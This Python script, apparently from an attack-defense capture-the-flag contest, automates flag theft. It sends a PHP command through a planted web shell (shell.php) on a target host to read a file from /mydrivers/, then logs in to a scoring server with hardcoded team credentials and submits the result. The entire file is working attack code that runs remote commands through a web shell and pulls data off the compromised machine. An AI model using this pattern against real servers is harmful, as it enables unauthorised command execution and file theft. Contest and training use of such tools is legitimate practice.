# -*- coding: utf-8 -*-
"""自动提交 flag 到计分平台 (Python3 修复版)

用法: python 自动提交flag.py <目标IP或URL> [flag]
  - 传入 URL 时: 尝试从目标 shell.php 提取 flag 并自动提交
  - 不传时: 默认演示流程
"""
import sys
import requests


def get_flag(url):
    """从目标 shell.php 提取 flag"""
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    data = {'cmd': 'echo file_get_contents("/mydrivers/".scandir("/mydrivers/")[2]);'}
    res = requests.post(url.rstrip('/') + '/shell.php', data=data, timeout=15)
    return url, res.text


def auto_submit(req, ip, flag):
    """提交 flag 到计分平台"""
    url = 'http://192.168.80.1/submit_flag.php'
    headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36'}
    data = {'ip': ip, 'flag': flag}
    res = req.post(url=url, data=data, headers=headers, timeout=15)
    print(res.text)


def login():
    """登录计分平台"""
    url = 'http://192.168.80.1/login.php'
    data = {'username': 'G001', 'password': '123456'}
    req = requests.session()
    res = req.post(url=url, data=data, timeout=15)
    return req


if __name__ == '__main__':
    target = sys.argv[1] if len(sys.argv) > 1 else None
    direct_flag = sys.argv[2] if len(sys.argv) > 2 else None
    if direct_flag:
        # 直接提交已知 flag
        logins = login()
        auto_submit(logins, target or 'unknown', direct_flag)
        print('已提交 flag:', direct_flag)
    elif target:
        # 从目标提取 flag 并提交
        logins = login()
        url, flag = get_flag(target)
        print('目标:', url, '提取到 flag:', flag.strip()[:100])
        auto_submit(logins, url, flag)
        print('提交完成')
    else:
        print('用法: python 自动提交flag.py <目标IP或URL> [flag]')
        print('  - 带 URL: 从目标 shell.php 提取 flag 并自动提交')
        print('  - 带 flag: 直接提交已知 flag')
